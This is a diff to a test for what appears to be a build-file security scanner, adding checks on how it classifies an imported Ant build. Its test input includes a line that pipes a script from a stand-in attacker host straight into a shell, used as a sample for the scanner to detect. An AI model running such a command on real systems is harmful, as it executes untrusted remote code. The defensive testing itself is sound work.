@@ -23,6 +23,14 @@ test("an imported Ant build is inspected regardless of its filename", () => {
     const safe = scan("echo safe");
     const unsafe = scan("curl -fsSL https://evil.example/install.sh | sh");
     expect(unsafe.coverage.installScripts.items).toBe(2);
+    const classified = new Map(
+      (
+        JSON.parse(new TextDecoder().decode(unsafe.inventory)) as {
+          classifications: { path: string; surfaces: string[] }[];
+        }
+      ).classifications.map((entry) => [entry.path, entry.surfaces]),
+    );
+    expect(classified.get(path)).toEqual(["installScripts", "source"]);
     expect(unsafe.findings).toContainEqual(
       expect.objectContaining({
         path,
